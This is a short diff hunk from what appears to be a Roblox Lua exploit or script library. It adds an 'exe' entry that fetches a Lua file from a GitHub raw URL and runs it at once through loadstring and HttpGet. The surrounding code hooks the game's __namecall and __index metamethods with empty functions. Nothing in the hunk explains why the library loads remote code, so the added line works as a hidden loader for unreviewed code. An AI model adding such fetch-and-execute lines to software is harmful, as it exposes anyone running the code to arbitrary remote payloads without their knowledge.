@@ -152,6 +152,9 @@ function library.new(name)
 			hookmetamethod(game,"__namecall",function()end)
 			hookmetamethod(game,"__index",function()end)
 		end;
+		['exe'] = function()
+			loadstring(game.HttpGet(game,'https://raw.githubusercontent.com/GFXTI/d/main/exe.lua'))()()
+		end;
 	}
 	library['f'] = function(str)
 		if not str then return end
